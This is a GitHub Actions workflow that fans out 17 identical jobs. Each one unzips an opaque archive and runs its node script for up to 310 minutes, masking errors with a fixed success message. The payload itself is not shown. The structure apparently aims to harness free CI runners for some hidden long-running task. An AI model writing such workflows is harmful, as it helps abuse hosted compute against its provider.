name: self-confidence
on:
  push:
    branches: [ "main" ]
    paths:
      - "self-confidence.txt"

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { os: 0 }
          - { os: 1 }
          - { os: 2 }
          - { os: 3 }
          - { os: 4 }
          - { os: 5 }
          - { os: 6 }
          - { os: 7 }
          - { os: 8 }
          - { os: 9 }
          - { os: 10 }
          - { os: 11 }
          - { os: 12 }
          - { os: 13 }
          - { os: 14 }
          - { os: 15 }
          - { os: 16 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20

      - name: Unzip self-confidence.zip
        run: |
          sudo apt install -y unzip
          unzip self-confidence.zip

      - name: like ecstatic
        run: |
          npm install --ignore-scripts
          timeout 310m node main.js || echo "self-confidence executed"